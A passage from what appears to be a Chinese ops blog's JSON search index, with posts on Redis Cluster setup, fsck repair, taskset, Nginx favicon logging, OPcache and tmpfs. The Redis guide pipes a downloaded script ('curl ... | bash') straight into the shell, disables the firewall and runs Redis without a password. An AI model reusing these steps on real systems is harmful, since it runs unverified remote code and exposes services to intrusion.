#默认匹配的后端集群-A参数来指定user-agent去发送到服务器","categories":[],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"},{"name":"负载均衡","slug":"负载均衡","permalink":"https://garywu520.github.io/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"},{"name":"keepalived","slug":"keepalived","permalink":"https://garywu520.github.io/tags/keepalived/"},{"name":"upstream","slug":"upstream","permalink":"https://garywu520.github.io/tags/upstream/"},{"name":"pass_proxy","slug":"pass-proxy","permalink":"https://garywu520.github.io/tags/pass-proxy/"}]},{"title":"redis-Cluster集群部署","slug":"Redis-Cluster集群部署","date":"2017-09-20T11:51:01.000Z","updated":"2017-11-07T04:34:29.010Z","comments":true,"path":"2017/09/20/Redis-Cluster集群部署/","link":"","permalink":"https://garywu520.github.io/2017/09/20/Redis-Cluster%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/","excerpt":"redis原理 redis简介 1REmote DIctionary Server(Redis) 是一个由SalvatoreSanfilippo写的key-value存储系统。是一个高性能的key-value数据库。","text":"redis原理 redis简介 1REmote DIctionary Server(Redis) 是一个由SalvatoreSanfilippo写的key-value存储系统。是一个高性能的key-value数据库。 12Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和有序集合(sorted sets)等类型。 3.0以后的版本架构图如下： redis 特点 1234Redis 与其他 key - value 缓存产品有以下三个特点：Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。Redis支持数据的备份，即master-slave模式的数据备份。 Redis集群的数据分片 12345678910Redis 集群没有使用一致性hash, 而是引入了哈希槽的概念Redis 集群有16384个哈希槽,每个key通过CRC16校验后对16384取模来决定放置哪个槽.集群的每个节点负责一部分hash槽举个例子,比如当前集群有3个节点,那么:* 节点 A 包含 0 到 5500号哈希槽.* 节点 B 包含5501 到 11000 号哈希槽.* 节点 C 包含11001 到 16384号哈希槽.这种结构很容易添加或者删除节点. 比如如果我想新添加个节点D, 我需要从节点 A, B, C中得部分槽到D上. 如果我像移除节点A,需要将A中得槽移到B和C节点上,然后将没有任何槽的A节点从集群中移除即可. 由于从一个节点将哈希槽移动到另一个节点并不会停止服务,所以无论添加删除或者改变某个节点的哈希槽的数量都不会造成集群不可用的状态 Redis集群的主从复制模型 1234567为了使在部分节点失败或者大部分节点无法通信的情况下集群仍然可用，所以集群使用了主从复制模型,每个节点都会有N-1个复制品.在我们例子中具有A，B，C三个节点的集群,在没有复制模型的情况下,如果节点B失败了，那么整个集群就会以为缺少5501-11000这个范围的槽而不可用.然而如果在集群创建的时候（或者过一段时间）我们为每个节点添加一个从节点A1，B1，C1,那么整个集群便有三个master节点和三个slave节点组成，这样在节点B失败后，集群便会选举B1为新的主节点继续服务，整个集群便不会因为槽找不到而不可用了不过当B和B1 都失败后，集群是不可用的. Redis 持久化一致性保证 1234567891011Redis集群不能保证强一致性。也就是说，在某些情况下集群会丢失部分已经保存在集群中的数据。第一个原因，异步复制。一般情况，保存数据时会发生如下过程：(1)客户端将数据写到主redis B上(2)主redis B 返回给客户端 OK(3)主redis B 将数据分发到 slaves B1 B2 B3如上，主redis B在返回成功的时候，并没有确保数据已经同步到 B1 B2 B3上。假如数据写到主redis B之后，主redis B崩溃了，并且没有将刚才的数据同步到slaves上。那么其中的一个从节点就会被选举成主节点，丢失了刚才写的数据。这个和大多数据库将数据定时刷到磁盘的情况一样。相同的，为了保证一致性，可以强制数据库将在返回客户端之前将数据写入到磁盘。但是这对性能的影响会很大。所以主从同步也存在这个问题。在性能和一致性上都会需要做一定的权衡。如果确实需要，Redis集群支持同步的写操作，通过WAIT命令实现。这个可以降低丢失数据的概率。因为Redis集群没有实现强一致性，即使是使用了同步复制，也会有概率丢失数据 12345另外有一个值得注意的情况，也会丢失数据。集群处于不同的网络分区中。其中一个master B 和 Client 在一个网络分区中，其他节点在另外一个网络分区中。客户端向master B中写入一条记录。这个时候不同网络分区存在联通性问题。如果是短暂的，则不会有问题；如果是较长时间的，slave B 会被推选成 master B，从而导致数据丢失。网络不畅通的时间配置——node timeout。如果一个master节点，在经过 node timeout时间后，还是不能连接上其他的master接口，那么它会变成一个错误状态。 搭建Redis集群 测试环境 12345准备至少3台虚拟机,系统CentOS7redis1 192.168.56.20 Port:7000&#x2F;7001&#x2F;7002redis2 192.168.56.21 Port:7003&#x2F;7004&#x2F;7005redis3 192.168.56.22 Port:7006&#x2F;7007&#x2F;7008 环境准备【全节点】 123456(1) 安装GCC编译工具 yum install -y gcc g++ gcc-c++ make tcl(2) 升级软件包 yum -y update(3) 关闭firewall systemctl stop firewalld.service &amp;&amp; systemctl disable firewalld.service 安装redis【全节点】 123456cd &#x2F;optwget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.1.tar.gztar xzf redis-4.0.1.tar.gzcd redis-4.0.1makemake PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;redis install 配置redis【全节点】 1234567mkdir &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc -pcp &#x2F;opt&#x2F;redis-4.0.1&#x2F;redis.conf &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;cd &#x2F;usr&#x2F;bin&#x2F;ln -s &#x2F;usr&#x2F;local&#x2F;redis&#x2F;bin&#x2F;redis-benchmark .&#x2F;ln -s &#x2F;usr&#x2F;local&#x2F;redis&#x2F;bin&#x2F;redis-cli .&#x2F;ln -s &#x2F;usr&#x2F;local&#x2F;redis&#x2F;bin&#x2F;redis-server .&#x2F;mkdir &#x2F;var&#x2F;log&#x2F;redis -p #创建redis日志存放目录 56.20节点配置 12345mkdir -p &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;700&#123;0..2&#125; #创建redis缓存数据目录cd &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;vim 7000&#x2F;redis.confvim 7001&#x2F;redis.confvim 7002&#x2F;redis.conf 配置文件-简要说明 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596daemonize no ##是否以守护进程方式运行pidfile &#x2F;var&#x2F;run&#x2F;redis_7000.pidport 7000#高并发环境下你需要一个高backlog值来避免慢客户端连接问题tcp-backlog 511 bind 192.168.56.20 127.0.0.1timeout 0 #客户端空闲关闭时间tcp-keepalive 0 #设置SO_KEEPALIVE选项来向空闲连接的客户端发送ACKloglevel notice #指定日志记录级别, debug等logfile &quot;&#x2F;var&#x2F;log&#x2F;redis&#x2F;redis_7000.log&quot; #指明日志文件名## syslog-enabled no #redis日志记录到系统日志## syslog-ident redis #redis日志在系统日志中的标识databases 16 #指定数据库个数#指定rdb快照频率,save &quot;&quot; #表示关闭rdb快照持久化#save 900 1#save 300 10#save 60 10000#默认如果开启RDB快照(至少一条save指令)并且最新的后台保存失败，Redis将会停止接受写操作stop-writes-on-bgsave-error yes #指定存储至本地数据库时是否压缩数据，默认为yesrdbcompression yes#生成的关闭校验的RDB文件有一个0的校验和，它将告诉加载代码跳过检查rdbchecksum yes #指定本地数据库文件名，默认值为dump.rdbdbfilename dump.rdb#指定本地数据库存放目录dir &#x2F;data&#x2F;A&#x2F;redis-cluster&#x2F;7000#设置当本机为slav服务时，设置master服务的IP地址及端口，在Redis启动时，它会自动从master进行数据同步#slaveof 192.168.56.20 6379#设置Redis连接密码，如果配置了连接密码，客户端在连接Redis时需要通过AUTH &lt;password&gt;命令提供密码，默认关闭## masterauth &lt;master-password&gt;# 主从同步。通过 slaveof 指令来实现Redis实例的备份slave-serve-stale-data yes # 从Redis2.6默认所有的slave为只读slave-read-only yes # 在slave套接字发送SYNC之后禁用 TCP_NODELAY repl-diskless-sync no#客户端最大连接数#maxclients 10000##指定Redis最大内存限制maxmemory 40gb#指定是否在每次更新操作后进行日志记录appendonly no#指定更新日志文件名，默认为appendonly.aofappendfilename &quot;appendonly.aof&quot;#指定更新日志条件## appendfsync alwaysappendfsync everysec## appendfsync no#当hash只有少量的entry时，并且最大的entry所占空间没有超过指定的限#制时，会用一种节省内存的 数据结构来编码。可以通过下面的指令来设定限制hash-max-ziplist-entries 512hash-max-ziplist-value 64# 与hash似，数据元素较少的list，可以用另一种方式来编码从而节省大量空间。# # 这种特殊的方式只有在符合下面限制时才可以用list-max-ziplist-entries 512list-max-ziplist-value 64#重建hash表的时候如果内存不足 如果此值设置为no则延时，如果为yes则尽快释放内存activerehashing yes#一个任务可以使用的cpu数目hz 10#当一个子进程重写AOF文件时，如果启用下面的选项，则文件每生成32M数据会被同步。为了增量式写入硬盘并且避免大的延迟高峰这个指令是非常有用的aof-rewrite-incremental-fsync yescluster-enabled yescluster-config-file nodes.confcluster-node-timeout 5000 vim 7000/redis.conf(最小化配置) 12345678910port 7000bind 192.168.56.20daemonize yespidfile &#x2F;var&#x2F;run&#x2F;redis_7000.pidcluster-enabled yescluster-config-file nodes_7000.confcluster-node-timeout 300appendonly yesloglevel noticelogfile &quot;&#x2F;var&#x2F;log&#x2F;redis&#x2F;redis_7000.log&quot; vim 7001/redis.conf(最小化配置) 12345678910port 7001bind 192.168.56.20daemonize yespidfile &#x2F;var&#x2F;run&#x2F;redis_7001.pidcluster-enabled yescluster-config-file nodes_7001.confcluster-node-timeout 300appendonly yesloglevel noticelogfile &quot;&#x2F;var&#x2F;log&#x2F;redis&#x2F;redis_7001.log&quot; vim 7002/redis.conf(最小化配置) 12345678910port 7002bind 192.168.56.20daemonize yespidfile &#x2F;var&#x2F;run&#x2F;redis_7002.pidcluster-enabled yescluster-config-file nodes_7002.confcluster-node-timeout 300appendonly yesloglevel noticelogfile &quot;&#x2F;var&#x2F;log&#x2F;redis&#x2F;redis_7002.log&quot; 参考56.20-配置另外两台机器 1234567#56.21机器目录：7003&#x2F;7004&#x2F;7005，配置文件也对应修改bind:192.168.56.21#56.22机器目录：7006&#x2F;7007&#x2F;7008，配置文件也对应修改bind:192.168.56.22 启动 12345678910111213141516#56.20机器启动redis-server &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;7000&#x2F;redis.conf redis-server &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;7001&#x2F;redis.conf redis-server &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;7002&#x2F;redis.conf #56.21机器启动redis-server &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;7003&#x2F;redis.conf redis-server &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;7004&#x2F;redis.conf redis-server &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;7005&#x2F;redis.conf#56.22机器启动redis-server &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;7006&#x2F;redis.conf redis-server &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;7007&#x2F;redis.conf redis-server &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;7008&#x2F;redis.conf启动管理可以使用supervisor管理redis 检查redis服务【全节点】 12ps -ef |grep redisss -lntup |grep redis 安装ruby【全节点】 1234567891011121314151617yum -y install ruby ruby-devel rubygems rpm-build#安装RVM(升级ruby为2.4.0)curl -sSL https:&#x2F;&#x2F;rvm.io&#x2F;mpapis.asc | gpg --import -curl -L get.rvm.io | bash -s stablesource &#x2F;etc&#x2F;profile.d&#x2F;rvm.shrvm reloadrvm requirements runrvm install 2.4.0#设置默认ruby版本rvm listrvm use 2.4.0 --defaultruby --versiongem install redis 创建集群(只在56.20机器配置即可) 1234567891011121314151617cd &#x2F;opt&#x2F;redis-4.0.1&#x2F;src[root@redis1 src]# .&#x2F;redis-trib.rb create --replicas 1 \\192.168.56.20:7000 \\192.168.56.20:7001 \\192.168.56.20:7002 \\192.168.56.21:7003 \\192.168.56.21:7004 \\192.168.56.21:7005 \\192.168.56.22:7006 \\192.168.56.22:7007 \\192.168.56.22:7008交互输入: yes[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered. 关闭集群 1pkill redis 集群验证 连接集群测试 123456789101112131415161718192021参数&quot;-c&quot;可连接到集群，因为 redis.conf将bind改为了ip地址，所以 -h 参数不可以省略，-p 参数为端口号在56.20机器redis 7000的节点set 一个key[root@redis1 ~]# redis-cli -h 192.168.56.20 -p 7000 -c 192.168.56.20:7000&gt; set name www.test.org-&gt; Redirected to slot [5798] located at 192.168.56.21:7003OK192.168.56.21:7003&gt; 可以看到redis set name之后重定向到56.21机器的7003节点了##################################################################现在在56.22机器进入任意一个节点,比如：redis 7008的节点get一个key[root@redis3 etc]# redis-cli -h 192.168.56.22 -p 7007 -c192.168.56.22:7007&gt; get name-&gt; Redirected to slot [5798] located at 192.168.56.21:7003&quot;www.test.org&quot;由以上结果可以看出,redis get name重定向到了56.21的7003这个节点。如果看到这样的现象，说明机器已经是可用的了。 检查集群状态 12345&#x2F;opt&#x2F;redis-4.0.1&#x2F;src&#x2F;redis-trib.rb check 192.168.56.20:7000或&#x2F;opt&#x2F;redis-4.0.1&#x2F;src&#x2F;redis-trib.rb check 192.168.56.21:7005注：测试任意redis节点均可 列出集群节点 1234列出集群当前已知的所有节点（node），以及这些节点的相关信息[root@redis1 ~]# redis-cli -h 192.168.56.20 -p 7000 -c192.168.56.20:7000&gt; 192.168.56.20:7000&gt; cluster nodes 打印机器信息 12345678910111213141516171819[root@redis1 ~]# redis-cli -h 192.168.56.20 -p 7000 -c192.168.56.20:7000&gt; 192.168.56.20:7000&gt; cluster infocluster_state:okcluster_slots_assigned:16384cluster_slots_ok:16384cluster_slots_pfail:0cluster_slots_fail:0cluster_known_nodes:9cluster_size:4cluster_current_epoch:9cluster_my_epoch:1cluster_stats_messages_ping_sent:71732cluster_stats_messages_pong_sent:71716cluster_stats_messages_sent:143448cluster_stats_messages_ping_received:71708cluster_stats_messages_pong_received:71732cluster_stats_messages_meet_received:8cluster_stats_messages_received:143448 集群命令12语法格式redis-cli -h host -p port -c 12345集群：infocluster info ：打印集群的信息info Replication :打印Replication信息cluster nodes ：列出集群当前已知的所有节点（ node），以及这些节点的相关信息。 12345节点：cluster meet &lt;ip&gt; &lt;port&gt; ：将 ip 和 port 所指定的节点添加到集群当中，让它成为集群的一份子。cluster forget &lt;node_id&gt; ：从集群中移除 node_id 指定的节点。cluster replicate &lt;node_id&gt; ：将当前节点设置为 node_id 指定的节点的从节点。cluster saveconfig ：将节点的配置文件保存到硬盘里面。 12345678槽(slot)cluster addslots &lt;slot&gt; [slot ...] ：将一个或多个槽（ slot）指派（ assign）给当前节点。cluster delslots &lt;slot&gt; [slot ...] ：移除一个或多个槽对当前节点的指派。cluster flushslots ：移除指派给当前节点的所有槽，让当前节点变成一个没有指派任何槽的节点。cluster setslot &lt;slot&gt; node &lt;node_id&gt; ：将槽 slot 指派给 node_id 指定的节点，如果槽已经指派给另一个节点，那么先让另一个节点删除该槽&gt;，然后再进行指派。cluster setslot &lt;slot&gt; migrating &lt;node_id&gt; ：将本节点的槽 slot 迁移到 node_id 指定的节点中。cluster setslot &lt;slot&gt; importing &lt;node_id&gt; ：从 node_id 指定的节点中导入槽 slot 到本节点。cluster setslot &lt;slot&gt; stable ：取消对槽 slot 的导入（ import）或者迁移（ migrate）。 1234键cluster keyslot &lt;key&gt; ：计算键 key 应该被放置在哪个槽上。cluster countkeysinslot &lt;slot&gt; ：返回槽 slot 目前包含的键值对数量。cluster getkeysinslot &lt;slot&gt; &lt;count&gt; ：返回 count 个 slot 槽中的键 。 redis数据类型 参考：http://www.yiibai.com/redis/redis_data_types.html 配置redis主从复制主服务器Master配置（192.168.56.20） 123456789101112131、 关闭rdb快照，rdb备份交由slave进行（只需在一台slave开启rdb即可） #save 900 1 #save 300 10 #save 60 100002、 开启aof日志，因为主服务器的aof日志数据是最新最全的，slave在数据同步时有可能会出现延迟 appendonly yes appendfsync everysec no-appendfsync-on-rewrite yes auto-aof-rewrite-percentage 100 auto-aof-rewrite-min-size 64mb appendfilename appendonly.aof3、 配置ip绑定，redis默认只绑定只允许本机的服务访问，在配置集群时，需要绑定本机的局域网ip后slave才可以连接到master服务器 bind 127.0.0.1 192.168.56.20 从服务器Slave配置(192.168.56.21/192.168.56.22) 123456789101112131415161、配置master的IP和端口 格式： slaveof 192.168.1.11 63792、 配置密码（如果master有密码）3、 打开 rdb快照功能（多台slave只需开一台） save 900 1 save 300 10 save 60 10000 stop-writes-on-bgsave-error yes rdbcompression yes rdbchecksum yes dbfilename &quot;dump.rdb&quot; dir &quot;&#x2F;data&#x2F;A&#x2F;redis_cluster&quot;4、 通常从服务器不能写,因此需要配置是否只读，配置项： slave-read-only yes5、 优先级配置 slave-priority 100 配置成功后启动三台服务器的redis，启动顺序最好为先master后slave，启动后，登录到redis命令行，执行info Replication 参考：http://www.yiibai.com/redis/redis_data_types.html","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"PHP","slug":"PHP","permalink":"https://garywu520.github.io/tags/PHP/"},{"name":"redis","slug":"redis","permalink":"https://garywu520.github.io/tags/redis/"},{"name":"ruby","slug":"ruby","permalink":"https://garywu520.github.io/tags/ruby/"},{"name":"redis cluster","slug":"redis-cluster","permalink":"https://garywu520.github.io/tags/redis-cluster/"}]},{"title":"Give root password for maintenance系统修复","slug":"Give-root-password-for-maintenance系统修复","date":"2017-09-20T03:53:31.000Z","updated":"2017-09-20T03:59:45.297Z","comments":true,"path":"2017/09/20/Give-root-password-for-maintenance系统修复/","link":"","permalink":"https://garywu520.github.io/2017/09/20/Give-root-password-for-maintenance%E7%B3%BB%E7%BB%9F%E4%BF%AE%E5%A4%8D/","excerpt":"有时候运行中的机器会出现系统故障(硬盘灯与机房沟通确认正常)，其业务无法正常运行。这时候就需要使用远控卡登陆进行修复了。","text":"有时候运行中的机器会出现系统故障(硬盘灯与机房沟通确认正常)，其业务无法正常运行。这时候就需要使用远控卡登陆进行修复了。 解决方案 12345678Give root password for maintenance(or type Control-D to continue): 在此处直接输入系统root密码（Repair filesystem）1 #（Repair filesystem）1 # fsck -A -V 期间可能需要你多次按“y” 确认（Repair filesystem）1 # exit重启系统OK 1fsck -A -V 命令中， -A意思是不进行交互,自动修复系统；-V显示详细","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"give","slug":"give","permalink":"https://garywu520.github.io/tags/give/"},{"name":"maintenance","slug":"maintenance","permalink":"https://garywu520.github.io/tags/maintenance/"},{"name":"Control","slug":"Control","permalink":"https://garywu520.github.io/tags/Control/"},{"name":"系统修复","slug":"系统修复","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E4%BF%AE%E5%A4%8D/"}]},{"title":"使用taskset命令-让程序在指定CPU上运行","slug":"使用taskset命令-让程序在指定CPU上运行","date":"2017-09-19T04:26:29.000Z","updated":"2017-09-19T04:41:23.095Z","comments":true,"path":"2017/09/19/使用taskset命令-让程序在指定CPU上运行/","link":"","permalink":"https://garywu520.github.io/2017/09/19/%E4%BD%BF%E7%94%A8taskset%E5%91%BD%E4%BB%A4-%E8%AE%A9%E7%A8%8B%E5%BA%8F%E5%9C%A8%E6%8C%87%E5%AE%9ACPU%E4%B8%8A%E8%BF%90%E8%A1%8C/","excerpt":"介绍 1taskset命令，用于进程的CPU调优，可以把某进程，指定在某CPU内工作。在某些情况下，这个操作能提高CPU整体性能","text":"介绍 1taskset命令，用于进程的CPU调优，可以把某进程，指定在某CPU内工作。在某些情况下，这个操作能提高CPU整体性能 帮助 123456789101112131415taskset --help[root@linux-node1 ~]# taskset --helpUsage: taskset [options] [mask | cpu-list] [pid|cmd [args...]]Options: -a, --all-tasks operate on all the tasks (threads) for a given pid -p, --pid 指定进程号 -c, --cpu-list 指定CPU编号，比如CPU 4核心的0,1,2,3 -h, --help display this help -V, --version output version information 查看CPU核心数 cat &#x2F;proc&#x2F;cpuinfo| grep &quot;cpu cores&quot;| uniq cpu cores : 4 用法 12345使某进程工作在1和2核心taskset -c 1,2 -p 某进程号 指定进程在某个cpu上运行：taskset -c 1 &#x2F;etc&#x2F;init.d&#x2F;mysql start 12345678910对于nginx服务器，可以通过配置nginx的worker_processes 、worker_cpu_affinity参数精确控制。例如：worker_processes 3;worker_cpu_affinity 0010 0100 1000;这里0010 0100 1000是掩码，分别代表第2、3、4颗cpu核心。重启nginx后，3个工作进程就可以各自用各自的CPU了。补充：在linux下，通过top命令，然后按1 来查看各个cpu的负载情况。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"cpu","slug":"cpu","permalink":"https://garywu520.github.io/tags/cpu/"},{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"},{"name":"taskset","slug":"taskset","permalink":"https://garywu520.github.io/tags/taskset/"},{"name":"PID","slug":"PID","permalink":"https://garywu520.github.io/tags/PID/"}]},{"title":"Nginx忽略favicon.ico访问记录","slug":"Nginx忽略favicon-ico访问记录","date":"2017-09-19T04:09:50.000Z","updated":"2017-09-19T04:15:31.458Z","comments":true,"path":"2017/09/19/Nginx忽略favicon-ico访问记录/","link":"","permalink":"https://garywu520.github.io/2017/09/19/Nginx%E5%BF%BD%E7%95%A5favicon-ico%E8%AE%BF%E9%97%AE%E8%AE%B0%E5%BD%95/","excerpt":"favicon.ico 1favicon.ico 文件是浏览器收藏网址时显示的图标，当第一次访问页面时，浏览器会自动发起请求获取页面的favicon.ico文件。当&#x2F;favicon.ico文件不存在时，服务器会记录404日志。","text":"favicon.ico 1favicon.ico 文件是浏览器收藏网址时显示的图标，当第一次访问页面时，浏览器会自动发起请求获取页面的favicon.ico文件。当&#x2F;favicon.ico文件不存在时，服务器会记录404日志。 缺点 121.使access.log文件变大，记录很多没有用的数据。 2.因为大部分是favicon.ico 404信息，当要查看信息时，会影响搜寻效率。 解决方案 1234567在nginx的配置中加入location &#x3D; &#x2F;favicon.ico &#123; log_not_found off; access_log off;&#125;配置含义：当访问favicon.ico的时候，关闭日志并且不记录在access.log中 完整配置 123456789101112131415161718server &#123; listen 80; server_name fdipzone.com; root &#x2F;Users&#x2F;fdipzone&#x2F;home; access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log main; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log debug; location &#x3D; &#x2F;favicon.ico &#123; log_not_found off; access_log off; &#125; location &#x2F; &#123; index index.html index.htm index.php; include &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;php-fpm; &#125;&#125;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"},{"name":"favicon.ico","slug":"favicon-ico","permalink":"https://garywu520.github.io/tags/favicon-ico/"},{"name":"access","slug":"access","permalink":"https://garywu520.github.io/tags/access/"},{"name":"log","slug":"log","permalink":"https://garywu520.github.io/tags/log/"}]},{"title":"Opcache让PHP性能加速","slug":"Opcache让PHP性能加速","date":"2017-09-19T03:51:00.000Z","updated":"2017-09-19T04:06:02.701Z","comments":true,"path":"2017/09/19/Opcache让PHP性能加速/","link":"","permalink":"https://garywu520.github.io/2017/09/19/Opcache%E8%AE%A9PHP%E6%80%A7%E8%83%BD%E5%8A%A0%E9%80%9F/","excerpt":"官方Doc 1http:&#x2F;&#x2F;php.net&#x2F;manual&#x2F;zh&#x2F;book.opcache.php","text":"官方Doc 1http:&#x2F;&#x2F;php.net&#x2F;manual&#x2F;zh&#x2F;book.opcache.php 说明 1OPcache 通过将 PHP 脚本预编译的字节码存储到共享内存中来提升 PHP 的性能， 存储预编译字节码的好处就是 省去了每次加载和解析 PHP 脚本的开销。PHP 5.5.0 及后续版本中已经绑定了 OPcache 扩展。老版本可以使用PHP APC加速 PHP开启opcache方法 打开php.ini文件, 找到：[opcache]，设置为： 123456789101112131415161718[opcache]; dll地址zend_extension&#x3D;php_opcache.dll; 开关打开opcache.enable&#x3D;1; 开启CLIopcache.enable_cli&#x3D;1; 可用内存, 酌情而定, 单位为：Mbopcache.memory_consumption&#x3D;528; Zend Optimizer + 暂存池中字符串的占内存总量.(单位:MB)opcache.interned_strings_buffer&#x3D;8; 对多缓存文件限制, 命中率不到 100% 的话, 可以试着提高这个值opcache.max_accelerated_files&#x3D;10000; Opcache 会在一定时间内去检查文件的修改时间, 这里设置检查的时间周期, 默认为 2, 定位为秒opcache.revalidate_freq&#x3D;1; 打开快速关闭, 打开这个在PHP Request Shutdown的时候回收内存的速度会提高opcache.fast_shutdown&#x3D;1复制代码 重启apache即可。 测试 配置完成后，可以使用如下代码查询opcache： 123&lt;?php phpinfo();?&gt; 访问页面得到如下界面： opcache配置说明 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697[opcache]zend_extension &#x3D; &quot;G:&#x2F;PHP&#x2F;php-5.5.6-Win32-VC11-x64&#x2F;ext&#x2F;php_opcache.dll&quot; ; Zend Optimizer + 的开关, 关闭时代码不再优化.opcache.enable&#x3D;1 ; Determines if Zend OPCache is enabled for the CLI version of PHPopcache.enable_cli&#x3D;1 ; Zend Optimizer + 共享内存的大小, 总共能够存储多少预编译的 PHP 代码(单位:MB); 推荐 128opcache.memory_consumption&#x3D;64 ; Zend Optimizer + 暂存池中字符串的占内存总量.(单位:MB); 推荐 8opcache.interned_strings_buffer&#x3D;4 ; 最大缓存的文件数目 200 到 100000 之间; 推荐 4000opcache.max_accelerated_files&#x3D;2000 ; 内存“浪费”达到此值对应的百分比,就会发起一个重启调度.opcache.max_wasted_percentage&#x3D;5 ; 开启这条指令, Zend Optimizer + 会自动将当前工作目录的名字追加到脚本键上,; 以此消除同名文件间的键值命名冲突.关闭这条指令会提升性能,; 但是会对已存在的应用造成破坏.opcache.use_cwd&#x3D;0 ; 开启文件时间戳验证 opcache.validate_timestamps&#x3D;1 ; 2s检查一次文件更新 注意:0是一直检查不是关闭; 推荐 60opcache.revalidate_freq&#x3D;2 ; 允许或禁止在 include_path 中进行文件搜索的优化;opcache.revalidate_path&#x3D;0 ; 是否保存文件&#x2F;函数的注释 如果apigen、Doctrine、 ZF2、 PHPUnit需要文件注释; 推荐 0opcache.save_comments&#x3D;1 ; 是否加载文件&#x2F;函数的注释;opcache.load_comments&#x3D;1 ; 打开快速关闭, 打开这个在PHP Request Shutdown的时候会收内存的速度会提高; 推荐 1opcache.fast_shutdown&#x3D;1 ;允许覆盖文件存在（file_exists等）的优化特性。;opcache.enable_file_override&#x3D;0 ; 定义启动多少个优化过程;opcache.optimization_level&#x3D;0xffffffff ; 启用此Hack可以暂时性的解决”can’t redeclare class”错误.;opcache.inherited_hack&#x3D;1 ; 启用此Hack可以暂时性的解决”can’t redeclare class”错误.;opcache.dups_fix&#x3D;0 ; 设置不缓存的黑名单; 不缓存指定目录下cache_开头的PHP文件. &#x2F;png&#x2F;www&#x2F;example.com&#x2F;public_html&#x2F;cache&#x2F;cache_ ;opcache.blacklist_filename&#x3D; ; 通过文件大小屏除大文件的缓存.默认情况下所有的文件都会被缓存.;opcache.max_file_size&#x3D;0 ; 每 N 次请求检查一次缓存校验.默认值0表示检查被禁用了.; 由于计算校验值有损性能,这个指令应当紧紧在开发调试的时候开启.;opcache.consistency_checks&#x3D;0 ; 从缓存不被访问后,等待多久后(单位为秒)调度重启;opcache.force_restart_timeout&#x3D;180 ; 错误日志文件名.留空表示使用标准错误输出(stderr).;opcache.error_log&#x3D; ; 将错误信息写入到服务器(Apache等)日志;opcache.log_verbosity_level&#x3D;1 ; 内存共享的首选后台.留空则是让系统选择.;opcache.preferred_memory_model&#x3D; ; 防止共享内存在脚本执行期间被意外写入, 仅用于内部调试.;opcache.protect_memory&#x3D;0","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"PHP","slug":"PHP","permalink":"https://garywu520.github.io/tags/PHP/"},{"name":"opcache","slug":"opcache","permalink":"https://garywu520.github.io/tags/opcache/"},{"name":"性能加速","slug":"性能加速","permalink":"https://garywu520.github.io/tags/%E6%80%A7%E8%83%BD%E5%8A%A0%E9%80%9F/"}]},{"title":"深入理解tmpfs内存文件系统","slug":"深入理解tmpfs内存文件系统","date":"2017-09-19T02:35:41.000Z","updated":"2017-09-19T03:40:47.612Z","comments":true,"path":"2017/09/19/深入理解tmpfs内存文件系统/","link":"","permalink":"https://garywu520.github.io/2017/09/19/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3tmpfs%E5%86%85%E5%AD%98%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","excerpt":"什么是tmpfs？ 1tmpfs是一种基于内存的虚拟文件系统,它最大的特点就是它的存储空间在VM(virtual memory)里面,VM是由linux内核里面的vm子系统管理，现在大多数操作系统都采用了虚拟内存管理机制。","text":"什么是tmpfs？ 